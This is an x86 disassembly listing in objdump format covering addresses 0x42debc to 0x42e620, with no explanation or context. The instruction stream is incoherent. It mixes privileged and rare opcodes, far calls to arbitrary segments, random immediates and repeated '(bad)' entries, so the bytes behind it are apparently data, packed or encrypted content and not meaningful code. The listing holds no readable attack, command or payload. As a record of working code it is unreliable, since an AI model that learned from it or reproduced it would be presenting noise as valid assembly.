  42debc:	lea    ecx,[ebx]
  42debe:	iret   
  42debf:	inc    ecx
  42dec0:	inc    esi
  42dec1:	aaa    
  42dec2:	push   ecx
  42dec3:	lods   eax,DWORD PTR ds:[esi]
  42dec4:	mov    dl,0x20
  42dec6:	pushf  
  42dec7:	xor    eax,0xdc622148
  42decc:	jge    0x42ded9
  42dece:	shl    BYTE PTR [edi],cl
  42ded0:	jmp    0x8404:0x80622536
  42ded7:	cmp    eax,0x2edb2065
  42dedc:	pop    ds
  42dedd:	cld    
  42dede:	pop    ebp
  42dedf:	push   cs
  42dee0:	pop    esi
  42dee1:	jp     0x42df46
  42dee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dee4:	cs fwait
  42dee6:	cld    
  42dee7:	mov    dx,0xc8ef
  42deeb:	stc    
  42deec:	mov    dl,0xee
  42deee:	or     eax,0xc0d609ab
  42def3:	aad    0xc6
  42def5:	and    eax,0xb766a3d
  42defa:	jne    0x42df50
  42defc:	jge    0x42df62
  42defe:	mov    esp,esp
  42df00:	mov    dl,0x91
  42df02:	pop    eax
  42df03:	ret    0x9a35
  42df06:	ja     0x42df04
  42df08:	sbb    BYTE PTR [ebx],cl
  42df0a:	imul   BYTE PTR [esi]
  42df0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df0d:	out    dx,al
  42df0e:	adc    eax,0x99af1739
  42df13:	xchg   edi,eax
  42df14:	cs mov ah,0x8
  42df17:	lea    ebp,[edx-0x4e]
  42df1a:	mov    dl,0x9
  42df1c:	ret    0x359d
  42df1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df21:	jbe    0x42deac
  42df23:	imul   edx,DWORD PTR [ebx+0x5e],0x40b2d257
  42df2a:	aaa    
  42df2b:	push   es
  42df2c:	icebp  
  42df2d:	fst    QWORD PTR [edx]
  42df2f:	adc    edi,DWORD PTR [ebx+0x30]
  42df32:	jb     0x42dfaf
  42df34:	inc    edx
  42df35:	or     eax,DWORD PTR [ebx-0x7fe37b36]
  42df3b:	pop    ebp
  42df3c:	jmp    0x5d58789f
  42df41:	mov    ebp,ds
  42df43:	adc    ebp,ebx
  42df45:	mov    esi,esi
  42df47:	mov    dh,0xc0
  42df49:	add    eax,0x995ca8d8
  42df4e:	sbb    al,BYTE PTR [ecx+0x5d028728]
  42df54:	mov    dl,0x38
  42df56:	xor    ebp,DWORD PTR [esp+ebp*2]
  42df59:	mov    ds:0xb2239c5,eax
  42df5e:	ret    
  42df5f:	pop    es
  42df60:	pop    DWORD PTR [edi]
  42df62:	add    BYTE PTR [ebp+ebp*4-0x1d],0x9a
  42df67:	jecxz  0x42df72
  42df69:	idiv   eax
  42df6b:	test   al,0xb0
  42df6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df6e:	arpl   bx,di
  42df70:	into   
  42df71:	lods   al,BYTE PTR ds:[esi]
  42df72:	call   0xd392:0x5516bc64
  42df79:	mov    ebx,0x10b8369a
  42df7e:	imul   edx,ecx,0xa675fe0b
  42df84:	lea    eax,[ebx+0x7a]
  42df87:	popa   
  42df88:	mov    BYTE PTR ds:[edi-0x7ac86379],dl
  42df8f:	sbb    esi,DWORD PTR [edx]
  42df91:	xor    ecx,eax
  42df93:	xchg   esi,eax
  42df94:	mov    dl,0xac
  42df96:	neg    esp
  42df98:	and    al,0x9e
  42df9a:	pushf  
  42df9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df9c:	mov    esi,0x97bbb8b6
  42dfa1:	fild   DWORD PTR [ecx+0x7f]
  42dfa4:	push   ds
  42dfa5:	daa    
  42dfa6:	call   0x7d08:0xcb1cf9cd
  42dfad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dfae:	ret    
  42dfaf:	sbb    DWORD PTR [ebp+0x2c],0x90efa7a4
  42dfb6:	je     0x42dfd2
  42dfb8:	mov    cl,0xc5
  42dfba:	popf   
  42dfbb:	enter  0x78a7,0x79
  42dfbf:	hlt    
  42dfc0:	shl    ah,cl
  42dfc2:	jp     0x42df50
  42dfc4:	sbb    BYTE PTR [edi],dh
  42dfc6:	or     BYTE PTR [esi+0x33],bh
  42dfc9:	retf   0xa1ea
  42dfcc:	pop    es
  42dfcd:	push   ebp
  42dfce:	pusha  
  42dfcf:	inc    ebx
  42dfd0:	or     dl,BYTE PTR [esi]
  42dfd2:	xchg   ebp,eax
  42dfd3:	sbb    al,0xd2
  42dfd5:	dec    eax
  42dfd6:	add    DWORD PTR [edi-0x70],0x4
  42dfda:	adc    DWORD PTR ds:0x529f0e8a,ebp
  42dfe0:	loope  0x42e018
  42dfe2:	mov    ecx,0xba8653a7
  42dfe7:	fist   DWORD PTR [eax]
  42dfe9:	setp   BYTE PTR [eax+0x54]
  42dfed:	cmc    
  42dfee:	xor    ch,dh
  42dff0:	stc    
  42dff1:	(bad)  
  42dff2:	mov    cl,0xa0
  42dff4:	(bad)  
  42dff5:	call   0xbd42a641
  42dffa:	sub    DWORD PTR [esp+edx*8-0x3a],esp
  42dffe:	xor    dh,BYTE PTR [eax+0x38]
  42e001:	adc    eax,0x6b10639a
  42e006:	adc    al,0x68
  42e008:	xchg   BYTE PTR [edi-0x6d],ah
  42e00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e00c:	fs pop edx
  42e00e:	adc    DWORD PTR [edi-0x2cfe3519],ecx
  42e014:	mov    dl,0x27
  42e016:	mov    cl,0x60
  42e018:	xor    DWORD PTR [esp+edx*2+0x9],ebx
  42e01c:	loop   0x42e015
  42e01e:	lods   al,BYTE PTR ds:[esi]
  42e01f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e020:	push   cs
  42e021:	jle    0x42e098
  42e023:	inc    esi
  42e024:	lea    ecx,[edi+0x4d]
  42e027:	shr    BYTE PTR [esi+eax*4+0x932fd10],1
  42e02e:	fmul   st(2),st
  42e030:	out    0x79,eax
  42e032:	sti    
  42e033:	lods   al,BYTE PTR ds:[esi]
  42e034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e035:	loop   0x42e088
  42e037:	xor    BYTE PTR [edx-0xf284879],0xff
  42e03e:	call   0xc6af:0x8a47e80f
  42e045:	xchg   ebx,eax
  42e046:	sbb    DWORD PTR [ebx+0x27ca899e],edi
  42e04c:	jmp    0xe780:0x9ccfd5af
  42e053:	xchg   BYTE PTR [edx-0x5a5e7600],dh
  42e059:	and    DWORD PTR [eax+0x78],ecx
  42e05c:	rcl    BYTE PTR [edi],1
  42e05e:	or     DWORD PTR ds:0x35a5b11f,ebx
  42e064:	xor    dl,cl
  42e066:	dec    esi
  42e067:	or     eax,0x1f9d96af
  42e06c:	mov    ebx,0x30a3658d
  42e071:	or     ebx,DWORD PTR [esp+esi*1+0x7e]
  42e075:	dec    ebp
  42e076:	mov    BYTE PTR [edi+0x70ead3ed],ah
  42e07c:	ficom  DWORD PTR cs:[edi-0x7b]
  42e080:	mov    dl,0x1e
  42e082:	fcomp  st(0)
  42e084:	maxps  xmm2,xmm3
  42e087:	lahf   
  42e088:	ror    BYTE PTR [ebx],cl
  42e08a:	mov    al,0x12
  42e08c:	loope  0x42e064
  42e08e:	(bad)  
  42e08f:	mov    ebx,0xf5955137
  42e094:	mov    bh,0x9
  42e096:	push   0xe85a2880
  42e09b:	jle    0x42e083
  42e09d:	imul   eax,DWORD PTR [ecx-0x20],0x25
  42e0a1:	or     eax,DWORD PTR [ebx]
  42e0a3:	or     BYTE PTR [esi],dl
  42e0a5:	icebp  
  42e0a6:	push   cs
  42e0a7:	jno    0x42e092
  42e0a9:	out    dx,al
  42e0aa:	call   0x7317:0x87e64f9e
  42e0b1:	fadd   QWORD PTR [ecx+0x376288a7]
  42e0b7:	sub    BYTE PTR [ecx],ah
  42e0b9:	mov    ds:0xaeae50c3,al
  42e0be:	in     al,dx
  42e0bf:	push   0xe92dc6f2
  42e0c4:	mov    cl,0x77
  42e0c6:	jg     0x42e06f
  42e0c8:	and    ch,BYTE PTR [ecx]
  42e0ca:	shr    BYTE PTR [eax+0x2a15e81e],1
  42e0d0:	mov    dl,0xa0
  42e0d2:	mov    ebp,0x46318eef
  42e0d7:	sbb    DWORD PTR [edx+0x5],ebx
  42e0da:	cmp    al,BYTE PTR [edx]
  42e0dc:	mov    al,0x7f
  42e0de:	(bad)  
  42e0e0:	int3   
  42e0e1:	mov    esi,DWORD PTR [esi+0x4a]
  42e0e4:	add    DWORD PTR [ecx],edi
  42e0e6:	call   0xa50c:0x615aa6ab
  42e0ed:	test   BYTE PTR [edi+ecx*2],ah
  42e0f0:	sahf   
  42e0f1:	or     ecx,DWORD PTR [edi]
  42e0f3:	xor    eax,0xbb66138c
  42e0f8:	data16 mov bh,0x98
  42e0fb:	inc    ebp
  42e0fc:	push   ebx
  42e0fd:	je     0x42e108
  42e0ff:	out    dx,eax
  42e100:	pop    ebx
  42e101:	dec    edx
  42e102:	jg     0x42e16d
  42e104:	pop    esi
  42e105:	jle    0x42e0c8
  42e107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e108:	ror    BYTE PTR [edi+ebx*2+0x2571025b],cl
  42e10f:	or     bh,BYTE PTR [ebp-0x15977e72]
  42e115:	jmp    0x42e0c7
  42e117:	loop   0x42e0d8
  42e119:	cwde   
  42e11a:	lahf   
  42e11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e11c:	pop    eax
  42e11d:	mov    edx,0x68875f51
  42e122:	repnz shl BYTE PTR [edx+0x6396e8a0],0x37
  42e12a:	pop    esi
  42e12b:	sub    eax,DWORD PTR [ebx+ecx*1+0x61]
  42e12f:	mov    ebp,0xe0eb1e6
  42e134:	cmc    
  42e135:	repnz call 0x3724:0x6a295841
  42e13d:	cdq    
  42e13e:	xchg   edi,eax
  42e13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e140:	pop    edi
  42e141:	ss pop esi
  42e143:	and    ch,0x3a
  42e146:	fnstenv [edi]
  42e148:	mov    WORD PTR ds:0x65c62741,?
  42e14e:	mov    ebp,0x87e28b8c
  42e153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e154:	retf   0x1910
  42e157:	jb     0x42e1a4
  42e159:	not    BYTE PTR [edi+ebp*1+0x39c86f8c]
  42e160:	icebp  
  42e161:	cs call 0x5406:0xc2e51ac1
  42e169:	or     ch,al
  42e16b:	pop    eax
  42e16c:	shl    dh,1
  42e16e:	test   eax,0xe7f94a23
  42e173:	xchg   BYTE PTR [edx-0x76],cl
  42e176:	call   0x140d:0x82848cb5
  42e17d:	push   esi
  42e17e:	push   cs
  42e17f:	out    dx,eax
  42e180:	xlat   BYTE PTR ds:[ebx]
  42e181:	adc    BYTE PTR [ebp+0x284b1be4],al
  42e187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e188:	mov    cl,0xeb
  42e18a:	shl    ebp,cl
  42e18c:	mov    bl,0xcf
  42e18e:	xchg   edi,eax
  42e18f:	jp     0x42e1f0
  42e191:	jg     0x42e212
  42e193:	(bad)  
  42e194:	pop    esi
  42e195:	test   esi,edx
  42e197:	mov    al,0x6c
  42e199:	sbb    edi,DWORD PTR [edi+0x67e3d1a7]
  42e19f:	repz sub eax,0xd2f99a00
  42e1a5:	jnp    0x42e17a
  42e1a7:	push   eax
  42e1a8:	in     eax,0xf9
  42e1aa:	dec    edx
  42e1ab:	mov    ecx,0xa7ad8edb
  42e1b0:	push   es
  42e1b1:	iret   
  42e1b2:	scas   al,BYTE PTR es:[edi]
  42e1b3:	fs cs dec edx
  42e1b6:	call   0x106e:0xb830d32d
  42e1bd:	cmp    DWORD PTR [edx],edx
  42e1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1c0:	cmp    DWORD PTR [edx+0x15010d8c],ecx
  42e1c6:	or     eax,0xd24db219
  42e1cb:	add    cl,BYTE PTR [eax-0x6506466f]
  42e1d1:	or     ebx,esi
  42e1d3:	stos   BYTE PTR es:[edi],al
  42e1d4:	push   edx
  42e1d5:	add    BYTE PTR [eax+ecx*2],dl
  42e1d8:	mov    eax,ds:0x897c9aff
  42e1dd:	or     eax,0x73142899
  42e1e2:	in     al,0x4a
  42e1e4:	shl    BYTE PTR [edi+edi*8],cl
  42e1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1e8:	in     eax,dx
  42e1e9:	out    dx,eax
  42e1ea:	push   edx
  42e1eb:	call   0x325dc250
  42e1f0:	sbb    eax,0xacbd5b9c
  42e1f5:	or     eax,0xe2f240de
  42e1fa:	mov    esi,0x79341450
  42e1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e200:	pop    ebp
  42e201:	ins    BYTE PTR es:[edi],dx
  42e202:	sbb    edi,esp
  42e204:	inc    esp
  42e205:	(bad)  
  42e206:	push   cs
  42e207:	mov    edi,DWORD PTR [ecx-0x7b]
  42e20a:	lahf   
  42e20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e20c:	xchg   ebx,eax
  42e20d:	stos   BYTE PTR es:[edi],al
  42e20e:	mov    ecx,0x4c0b8883
  42e213:	adc    eax,DWORD PTR [ebp-0x45f79130]
  42e219:	xor    bl,BYTE PTR [edx-0x64f05e5b]
  42e21f:	inc    ebp
  42e220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e221:	rol    BYTE PTR ds:0x8a67b1a7,cl
  42e227:	mov    eax,DWORD PTR [ebp-0x25]
  42e22a:	jg     0x42e1f8
  42e22c:	mov    dl,0xfe
  42e22e:	xlat   BYTE PTR ds:[ebx]
  42e22f:	lea    edx,[edi+edx*1]
  42e232:	pop    edx
  42e233:	sub    ebp,DWORD PTR [ebp+0x5bc9100a]
  42e239:	mov    al,0x2f
  42e23b:	(bad)  
  42e23c:	xor    cl,BYTE PTR [ebx+0x4c]
  42e23f:	and    al,0x4b
  42e241:	ret    0xd09a
  42e244:	sbb    DWORD PTR [esi],esp
  42e246:	cmc    
  42e247:	mov    esp,DWORD PTR [eax]
  42e249:	and    al,0xd2
  42e24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e24c:	jge    0x42e231
  42e24e:	xor    BYTE PTR [edi+edi*1+0x34],0xad
  42e253:	pop    esp
  42e254:	sub    dh,dh
  42e256:	call   0x7ee2:0x7f905d11
  42e25d:	cmp    ch,BYTE PTR [edx+0x135480a7]
  42e263:	mov    edi,0x8e33d79f
  42e268:	jmp    0x7c8b:0xa9a7022b
  42e26f:	mov    bl,0x47
  42e271:	pop    edi
  42e272:	stc    
  42e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e274:	cli    
  42e275:	sbb    BYTE PTR [edi],0x14
  42e278:	lahf   
  42e279:	xchg   edx,eax
  42e27a:	sar    bl,0xb2
  42e27d:	or     dh,BYTE PTR [ebp+0x5f2ecf07]
  42e283:	dec    BYTE PTR [edx]
  42e285:	adc    al,0xb
  42e287:	adc    eax,0x7fe5cb7d
  42e28c:	ins    DWORD PTR es:[edi],dx
  42e28d:	sar    BYTE PTR [ebx-0x79],cl
  42e290:	mov    dl,0xc2
  42e292:	psubq  mm1,QWORD PTR [eax-0x5f]
  42e296:	shl    BYTE PTR [ecx],0xd9
  42e299:	xor    bh,ch
  42e29b:	mov    ds:0x79d701b2,eax
  42e2a0:	neg    bl
  42e2a2:	rol    BYTE PTR [eax],1
  42e2a4:	mov    dl,0x7b
  42e2a6:	lock pop ecx
  42e2a8:	mov    BYTE PTR [edi+eax*4+0x7b2fcc76],bl
  42e2af:	lahf   
  42e2b0:	loope  0x42e2bd
  42e2b2:	inc    edi
  42e2b3:	pop    ds
  42e2b4:	sub    BYTE PTR [esi-0x36],0xc8
  42e2b8:	mov    esp,0xa8d0c305
  42e2bd:	cmp    eax,0x17262d9a
  42e2c2:	loop   0x42e341
  42e2c4:	mov    bh,0xb
  42e2c6:	pushf  
  42e2c7:	fcomi  st,st(5)
  42e2c9:	mov    ds,eax
  42e2cb:	pop    ebp
  42e2cc:	dec    esp
  42e2cd:	adc    BYTE PTR [edx-0x2ece3c2f],bl
  42e2d3:	bound  ebx,QWORD PTR cs:[ecx+0x3c]
  42e2d7:	cdq    
  42e2d8:	stos   BYTE PTR es:[edi],al
  42e2d9:	jle    0x42e2c3
  42e2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2dc:	rcl    ecx,1
  42e2de:	inc    esi
  42e2df:	loope  0x42e342
  42e2e1:	repnz fiadd DWORD PTR [edx+esi*4]
  42e2e5:	cwde   
  42e2e6:	daa    
  42e2e7:	es out dx,eax
  42e2e9:	add    DWORD PTR [esi+eax*4+0x4fc6f741],ecx
  42e2f0:	bound  ecx,QWORD PTR [ebx]
  42e2f2:	lds    edi,FWORD PTR [ecx+0x23]
  42e2f5:	xchg   DWORD PTR [edi-0x14],esi
  42e2f8:	add    ah,bl
  42e2fa:	out    0x34,eax
  42e2fc:	lods   eax,DWORD PTR ds:[esi]
  42e2fd:	sub    al,0x31
  42e2ff:	jne    0x42e2b3
  42e301:	and    al,0x58
  42e303:	bound  esp,QWORD PTR [ebx-0x7e533dcc]
  42e309:	xor    BYTE PTR [ebx+0x79d2b200],0x3
  42e310:	mov    WORD PTR [ecx+0x91d429d],ss
  42e316:	and    bh,BYTE PTR [ebx-0x3fede7e]
  42e31c:	mov    esi,0xde849d00
  42e321:	(bad)  
  42e322:	nop
  42e323:	or     eax,0x34560e71
  42e328:	icebp  
  42e329:	mov    ebx,DWORD PTR [ebp+ebx*8-0x6e]
  42e32d:	cmp    al,0x9a
  42e32f:	cmp    dl,al
  42e331:	bswap  edx
  42e333:	femms  
  42e335:	and    BYTE PTR [ebx-0x11ca0157],bl
  42e33b:	inc    esi
  42e33c:	aad    0xf0
  42e33e:	test   eax,0xdab7fb0
  42e343:	add    BYTE PTR [ebp-0x12346567],bh
  42e349:	jo     0x42e3b6
  42e34b:	ins    DWORD PTR es:[edi],dx
  42e34c:	call   0xb9ec:0x82a7ec81
  42e353:	xchg   ebx,eax
  42e354:	popf   
  42e355:	frstor [esi-0x6524af56]
  42e35b:	jge    0x42e362
  42e35d:	cmp    bl,BYTE PTR [esi+0x17]
  42e360:	icebp  
  42e361:	fmul   DWORD PTR [ecx]
  42e363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e364:	mov    ecx,0x7590c861
  42e369:	stos   BYTE PTR es:[edi],al
  42e36a:	aaa    
  42e36b:	fild   WORD PTR [ebx+0x7b]
  42e36e:	dec    edx
  42e36f:	inc    edx
  42e370:	mov    dl,0x72
  42e372:	add    esi,eax
  42e374:	ds (bad) 
  42e376:	(bad)  
  42e377:	fucom  st(7)
  42e379:	or     esp,edi
  42e37b:	call   0x29085b0e
  42e380:	mov    eax,0xa8359d17
  42e385:	test   ecx,esp
  42e387:	scas   al,BYTE PTR es:[edi]
  42e388:	call   0xa7c57e67
  42e38d:	xor    eax,0x95be20f
  42e392:	fdivr  DWORD PTR [eax+0x4b]
  42e395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e396:	xor    edi,DWORD PTR [edx-0x2f]
  42e399:	hlt    
  42e39a:	sbb    dh,BYTE PTR [ebx]
  42e39c:	add    eax,0xffffff9d
  42e39f:	mov    ds,esp
  42e3a1:	pop    ebp
  42e3a2:	or     al,0xda
  42e3a4:	xchg   edx,eax
  42e3a5:	cs (bad) 
  42e3a7:	mov    esi,0xa4bb0b94
  42e3ac:	mov    dh,0x6f
  42e3ae:	mov    ds:0x9ac20e06,al
  42e3b3:	nop
  42e3b4:	aad    0xea
  42e3b6:	dec    edx
  42e3b7:	lock dec ebp
  42e3b9:	cmc    
  42e3ba:	push   0x5d35acda
  42e3bf:	adc    BYTE PTR [edx+0x2d2620d8],dh
  42e3c5:	add    eax,0xaeb54e67
  42e3ca:	sub    ecx,DWORD PTR [ecx+0x7fda1f84]
  42e3d0:	cwde   
  42e3d1:	loope  0x42e364
  42e3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3d4:	test   eax,0xb7aeef22
  42e3d9:	fwait
  42e3da:	dec    ebx
  42e3db:	retf   
  42e3dc:	mov    dl,0x90
  42e3de:	adc    eax,0x49793bc1
  42e3e3:	ja     0x42e41d
  42e3e5:	or     eax,DWORD PTR [eax+eiz*8-0x5c]
  42e3e9:	scas   eax,DWORD PTR es:[edi]
  42e3ea:	inc    eax
  42e3eb:	adc    DWORD PTR [ebx+0x2cb5c6a6],edx
  42e3f1:	or     esp,DWORD PTR [edi+edi*2]
  42e3f4:	xchg   esi,ecx
  42e3f6:	dec    ecx
  42e3f7:	mov    bh,0xac
  42e3f9:	or     esp,DWORD PTR ds:0x74eb03f
  42e3ff:	dec    edi
  42e400:	js     0x42e3cd
  42e402:	xchg   esp,eax
  42e403:	out    dx,eax
  42e404:	and    BYTE PTR [edi],dh
  42e406:	xor    eax,0x442f7ae7
  42e40b:	pusha  
  42e40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e40d:	add    al,0xd1
  42e40f:	mov    ebx,0xf83a784f
  42e414:	outs   dx,BYTE PTR ds:[esi]
  42e415:	adc    eax,0xacb60bc4
  42e41a:	iret   
  42e41b:	int    0xd7
  42e41d:	mov    ds,WORD PTR [edx-0x4a]
  42e420:	sbb    BYTE PTR [esi-0x3c3d581e],bl
  42e426:	push   ss
  42e427:	pop    edx
  42e428:	jns    0x42e3ee
  42e42a:	pop    ebx
  42e42b:	js     0x42e3df
  42e42d:	push   esp
  42e42e:	aad    0x90
  42e430:	xor    dl,BYTE PTR [edi+ecx*4]
  42e433:	test   eax,0xd4a50bdb
  42e438:	sub    edi,eax
  42e43a:	(bad)  
  42e43b:	sti    
  42e43c:	xchg   edi,eax
  42e43d:	loope  0x42e3d9
  42e43f:	and    eax,0x553fc6b0
  42e444:	popa   
  42e445:	lahf   
  42e446:	test   eax,0x8b30b7a4
  42e44b:	or     eax,DWORD PTR [edi+0x4d]
  42e44e:	or     bl,bl
  42e450:	pop    DWORD PTR [ebp-0x66]
  42e453:	and    ch,dl
  42e455:	push   edx
  42e456:	dec    ebx
  42e457:	mov    esi,0xa7e11fb9
  42e45c:	push   edi
  42e45d:	jp     0x42e3f4
  42e45f:	ds aaa 
  42e461:	add    ebx,ecx
  42e463:	mov    edx,0xaa2d62b2
  42e468:	jnp    0x42e455
  42e46a:	loop   0x42e415
  42e46c:	add    cl,bh
  42e46e:	out    dx,eax
  42e46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e470:	sbb    al,0x83
  42e472:	pushf  
  42e473:	je     0x42e47c
  42e475:	xchg   BYTE PTR [esi+0x6c97b257],al
  42e47b:	loopne 0x42e47b
  42e47d:	stc    
  42e47e:	xor    BYTE PTR [ebx],0x6d
  42e481:	add    al,0xb7
  42e483:	pop    ss
  42e484:	int    0x16
  42e486:	popf   
  42e487:	sbb    eax,0x24aa9a4f
  42e48c:	jp     0x42e4f9
  42e48e:	js     0x42e4b7
  42e490:	mov    dl,0xd9
  42e492:	data16 or ch,BYTE PTR [edx-0x2e5e9f46]
  42e499:	or     edi,DWORD PTR [eax]
  42e49b:	je     0x42e478
  42e49d:	sahf   
  42e49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e49f:	aad    0xeb
  42e4a1:	in     eax,dx
  42e4a2:	fwait
  42e4a3:	inc    ebx
  42e4a4:	mov    ebp,0x2b816caa
  42e4a9:	push   ds
  42e4aa:	icebp  
  42e4ab:	and    al,0x14
  42e4ad:	dec    ebx
  42e4ae:	jp     0x42e48a
  42e4b0:	ins    DWORD PTR es:[edi],dx
  42e4b1:	or     eax,0x7a5ca29a
  42e4b6:	sub    DWORD PTR cs:[esi-0xa],ebx
  42e4ba:	dec    esi
  42e4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4bc:	add    al,0x4c
  42e4be:	mov    al,ds:0xb464bb99
  42e4c3:	pushf  
  42e4c4:	sahf   
  42e4c5:	call   0x673e:0xa5bcdc44
  42e4cc:	push   edx
  42e4cd:	mov    eax,0xb294636
  42e4d2:	int    0x77
  42e4d4:	shr    DWORD PTR [ebp+0x5fe968a0],0x9a
  42e4db:	hlt    
  42e4dc:	sub    al,0x66
  42e4de:	adc    BYTE PTR [ebp-0x58dbcddb],bh
  42e4e4:	into   
  42e4e5:	xor    al,0x62
  42e4e7:	scas   eax,DWORD PTR es:[edi]
  42e4e8:	iret   
  42e4e9:	jae    0x42e510
  42e4eb:	xor    DWORD PTR [ebp-0x55cfd8c],edi
  42e4f1:	sub    esi,esp
  42e4f3:	int3   
  42e4f4:	xor    BYTE PTR [esi-0x16],bl
  42e4f7:	mov    al,ds:0x5cd0324a
  42e4fc:	sbb    dl,0xfb
  42e4ff:	dec    esp
  42e500:	jbe    0x42e501
  42e502:	aas    
  42e503:	or     esi,DWORD PTR [edx-0x30bd46c3]
  42e509:	stc    
  42e50a:	imul   ebx,esi,0x21
  42e50d:	and    eax,0xb46e3ae
  42e512:	adc    esp,ebp
  42e514:	pop    edx
  42e515:	nop
  42e516:	adc    al,0xf0
  42e518:	mov    bl,0x45
  42e51a:	cmp    esp,edx
  42e51c:	fisub  DWORD PTR [ecx]
  42e51e:	inc    edx
  42e51f:	nop
  42e520:	ror    bh,cl
  42e522:	hlt    
  42e523:	dec    edi
  42e524:	jle    0x42e530
  42e526:	lods   al,BYTE PTR ds:[esi]
  42e527:	cmp    ch,BYTE PTR [ebx+0xa1c7e9]
  42e52d:	sub    edi,edi
  42e52f:	inc    edi
  42e530:	mov    dl,0x45
  42e532:	push   eax
  42e533:	popf   
  42e534:	lahf   
  42e535:	mov    DWORD PTR [ebx-0x40],edx
  42e538:	push   0xb
  42e53a:	mov    bl,0xef
  42e53c:	rcl    DWORD PTR [ebx+0x6909a178],0xa4
  42e543:	int    0x6e
  42e545:	mov    esi,DWORD PTR [edx]
  42e547:	rcr    DWORD PTR [esp+ebx*1],1
  42e54a:	add    DWORD PTR [esi-0x3e],eax
  42e54d:	or     ebp,DWORD PTR [edx]
  42e54f:	inc    edi
  42e550:	inc    BYTE PTR [ebx+eiz*2-0x65023491]
  42e557:	sub    ecx,DWORD PTR [ecx]
  42e559:	xchg   ebx,eax
  42e55a:	jle    0x42e556
  42e55c:	lock fs mov bh,0xa6
  42e560:	push   ss
  42e561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e562:	shl    eax,cl
  42e564:	pop    ebp
  42e565:	or     eax,0x2cd24580
  42e56a:	sub    DWORD PTR [eax],edi
  42e56c:	mov    dl,0xfd
  42e56e:	add    DWORD PTR [edx-0x9],esp
  42e571:	sbb    dl,BYTE PTR [ecx]
  42e573:	(bad)  
  42e574:	jae    0x42e581
  42e576:	jle    0x42e5ea
  42e578:	jl     0x42e505
  42e57a:	aam    0xa8
  42e57c:	mov    cl,0xc2
  42e57e:	in     eax,0xcf
  42e580:	mov    BYTE PTR [eax],ch
  42e582:	popf   
  42e583:	sub    DWORD PTR [ebp-0x80],ebp
  42e586:	scas   al,BYTE PTR es:[edi]
  42e587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e588:	fidiv  WORD PTR [edi+0x31]
  42e58b:	jbe    0x42e602
  42e58d:	xchg   ebp,eax
  42e58e:	inc    edx
  42e58f:	jmp    0xf56:0xa72779f4
  42e596:	xchg   ebp,eax
  42e597:	push   cs
  42e598:	xchg   BYTE PTR [esp+eiz*4+0x53],ah
  42e59c:	mov    dl,0x71
  42e59e:	mov    ebx,0x8cb13be0
  42e5a3:	mov    esp,0xe65a0b99
  42e5a8:	aam    0x3d
  42e5aa:	es popf 
  42e5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5ad:	xchg   BYTE PTR [ecx+edi*4+0x23da4827],al
  42e5b4:	cmp    BYTE PTR [edi+0xc],ch
  42e5b7:	or     al,0x1d
  42e5b9:	or     esp,edx
  42e5bb:	fwait
  42e5bc:	rol    BYTE PTR [ebx],cl
  42e5be:	and    eax,0x9a143776
  42e5c3:	mov    eax,ds:0x83fb999d
  42e5c8:	xchg   esp,eax
  42e5c9:	mov    bh,0x29
  42e5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5cc:	leave  
  42e5cd:	inc    ecx
  42e5ce:	pop    ss
  42e5cf:	mov    WORD PTR ds:[bx+di],cs
  42e5d3:	es dec edx
  42e5d5:	and    ah,BYTE PTR [edi-0x39]
  42e5d8:	mov    cl,0xed
  42e5da:	xlat   BYTE PTR ds:[ebx]
  42e5db:	mov    ecx,0x6fd81c77
  42e5e0:	imul   ebp,DWORD PTR [eax-0x50],0x3cae1c9c
  42e5e7:	mov    ds:0x46b50858,al
  42e5ec:	sbb    ebp,DWORD PTR [ebx]
  42e5ee:	xor    bh,BYTE PTR [ecx-0x50]
  42e5f1:	ret    0x439a
  42e5f4:	jg     0x42e62f
  42e5f6:	and    al,0xc8
  42e5f8:	pop    ecx
  42e5f9:	mov    al,ds:0xde39875
  42e5fe:	sbb    ch,ah
  42e600:	std    
  42e601:	add    bl,BYTE PTR [eax-0x799d7a1d]
  42e607:	mov    edx,0xc21a0808
  42e60c:	cs pop eax
  42e60e:	mov    dh,0xb8
  42e610:	or     al,0xb
  42e612:	lahf   
  42e613:	and    ebx,esi
  42e615:	mov    BYTE PTR [eax-0x640970b5],0x7a
  42e61c:	sbb    bl,ch
  42e61e:	xor    esi,esp
  42e620:	jmp    0x4b5f60ca
